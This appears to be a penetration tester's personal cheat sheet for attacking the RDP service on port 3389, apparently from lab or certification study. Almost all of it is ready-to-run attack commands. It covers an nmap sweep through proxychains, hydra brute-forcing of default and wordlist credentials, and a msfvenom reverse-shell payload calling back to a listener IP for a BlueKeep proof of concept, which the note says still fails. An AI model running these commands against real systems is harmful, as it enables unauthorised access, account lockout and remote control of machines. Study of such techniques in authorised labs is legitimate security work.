#service 
<% tp.file.rename("1_RDP_3389")%>
☑️
> Auch ms-wbt-server

## Check for machines that have it enabled
```bash
proxychains nmap -Pn -sT -p3389 $(cat /etc/hosts | grep 172 | cut -f 1 | tr '\n' ' ')
```
## Bruteforce default credentials
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt rdp://$hip -vV -t 1 -I -s 3389
```
	CAREFUL, likely to lock accounts!
Or for a given user:
```bash
hydra -l $user -P /usr/share/wordlists/rockyou30.txt rdp://$hip -V -t 4 -I -s 3389
```
## Connect to RDP
```bash
connect-windows $hip [$user] [$password]
```

## BlueKeep
<= Windows 7 or <= Windows Server 2008
Payload:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.206 LPORT=4545 -f py
```
Integrate it at `win7_32_poc.py` where it states "`# replace buf with your shellcode`"
> Currently still fails, a python dependency issue